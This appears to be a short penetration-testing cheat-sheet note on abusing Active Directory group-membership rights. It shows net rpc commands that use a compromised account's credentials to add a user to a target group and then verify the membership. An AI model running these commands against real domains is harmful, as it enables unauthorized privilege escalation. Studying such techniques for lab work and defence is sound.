can add any object (including yourself) to a group and get all permissions granted to that group
  
  
add the object to the group
```JavaScript
net rpc group addmem "<target_group>" "<target_user>" -U '<DOMAIN>'/'<comped_user>'%'<pass>' -S "<IP>"
```
- if you get no return message that’s good
![[../../assets/AddMember/image 407.png|image 407.png]]
  
verify group membership
```JavaScript
net rpc group members "<group>" -U "<DOMAIN>"/"<user>"%'<pass>' -S "<IP>"
```
![[../../assets/AddMember/image 1 304.png|image 1 304.png]]